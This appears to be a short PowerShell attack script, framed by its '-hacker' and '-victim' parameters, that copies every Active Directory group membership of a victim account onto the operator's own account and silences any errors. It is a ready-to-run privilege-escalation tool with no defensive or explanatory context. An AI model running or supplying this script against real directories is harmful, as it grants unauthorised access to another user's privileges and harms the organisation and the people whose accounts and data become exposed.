Param($hacker, $victim)

if ($hacker -eq $null -and $victim -eq $null) {
Write-Host "Usage: .\CopyGroups.ps1 -hacker {username} -victim {username}"
Exit
}

if ($hacker -eq $null) {
   Write-Host "Use the -hacker tag to input your account.";
   Exit
}
if ($victim -eq $null) {
   Write-Host "Use the -victim tag to specify the account you are copying from.";
   Exit
}
import-module activedirectory

Try { $tmp = Get-ADUser -Identity $hacker }
Catch {
Write-Host "Could not find '$hacker' in AD"
Exit
}
Try { $tmp = Get-ADUser -Identity $victim }
Catch {
Write-Host "Could not find '$victim' in AD"
Exit
}

Get-ADUser –Identity $victim -Properties memberof | Select-Object –ExpandProperty memberof | Add-ADGroupMember –Members $hacker -erroraction 'silentlycontinue'
